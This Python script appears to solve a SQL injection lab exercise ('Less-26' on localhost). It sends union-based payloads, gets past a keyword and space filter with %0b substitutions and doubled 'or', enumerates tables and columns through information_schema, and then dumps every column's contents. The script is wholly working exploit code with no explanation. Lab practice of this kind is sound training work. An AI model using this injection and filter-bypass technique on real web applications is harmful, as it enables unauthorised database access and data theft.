import requests
import base64

get_table = "(select group_concat(table_name) from infoorrmation_schema.tables where table_schema= database())".replace(' ', '%0b')
get_column = "(select group_concat(column_name) from infoorrmation_schema.columns where table_name = '{0}')".replace(' ','%0b')
get_secret = "(select group_concat({0}) from {1})".replace(' ', '%0b')
url = "http://localhost:1234/Less-26/?id="
session = requests.Session()

payload = "0' union select 1,{},'3".replace(' ','%0b')
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[570:-294-len(payload.format(get_table))]
tables = temp.split(',')
print("Tables :",*tables)
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    response = requests.post(url+payload.format(find))
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[570:-292-len(payload.format(find))]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, i).replace('or', 'oorr')
        response = requests.post(url+payload.format(find))
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[570:-302-len(payload.format(find).replace('oorr', 'or'))])
